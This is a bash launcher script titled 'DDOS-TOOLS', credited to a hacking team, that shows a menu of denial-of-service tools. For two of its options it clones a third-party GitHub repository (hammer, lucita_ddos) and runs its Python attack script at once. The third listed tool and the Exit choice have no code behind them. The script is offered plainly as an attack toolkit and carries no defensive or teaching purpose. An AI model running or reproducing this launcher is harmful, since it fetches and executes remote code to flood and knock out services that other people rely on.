#!/bin/bash
#Variables
b="\033[1m"
u="\033[4m"
bl="\033[30m"
r="\033[31m"
g="\033[32m"
bu="\033[34m"
m="\033[35m"
c="\033[36m"
w="\033[37m"
endc="\033[0m"
enda="\033[0m"
blue="\033[1;34m"
cyan="\033[1;36m"
red="\033[1;31m"
clear
figlet DDOS-TOOLS | lolcat
echo         "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" | lolcat
echo         " Creadby   : Al Ghokil $white                      " | lolcat
echo         " Team        : Cyber Muslim Uknnown Friend $white  " | lolcat
echo         " Contact     : 0813×××××××××××××××× $white         " | lolcat
echo         " ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" | lolcat

echo ""

echo "1.> hammer"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━" | lolcat
echo "2.> lucita-ddos"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━" | lolcat
echo "3.> Litedos"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━" | lolcat
echo "4.> Exit"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
read -p "root@T00Ls-alghokil~#" bro

if [ $bro = 1 ] || [ $bro = 1 ]
then
clear
figlet "cybermuslim" | lolcat
git clone https://github.com/cyweb/hammer
mv hammer $HOME
cd $HOME/hammer
python hammer.py
fi

if [ $bro = 2 ] || [ $bro = 2 ]
then
clear
figlet "cybermuslim" | lolcat
git clone https://github.com/zlucifer/lucita_ddos
mv lucita_ddos $HOME
cd $HOME/lucita_ddos
python licita_ddos.py
fi